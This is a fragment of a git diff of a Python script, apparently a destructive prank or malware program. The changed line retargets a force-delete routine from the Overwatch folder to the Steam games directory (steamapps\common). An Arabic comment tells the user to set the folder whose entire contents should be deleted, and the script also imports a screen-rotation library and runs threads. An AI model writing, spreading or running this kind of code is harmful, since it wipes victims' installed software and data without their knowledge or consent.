@@ -8,7 +8,7 @@ import rotatescreen as rs
 import threading
 
 def m1():
-    folder_path = r"C:\Program Files (x86)\Overwatch" #حط الملف الي تبيه ينحذف كل شي داخله
+    folder_path = r"C:\Program Files (x86)\Steam\steamapps\common" #حط الملف الي تبيه ينحذف كل شي داخله
 
     def force_delete(path):
         os.chmod(path, stat.S_IWRITE)
@@ -55,6 +55,7 @@ t3.start()
 t1.join()
 t2.join()
 t3.join()
+
 
 
 
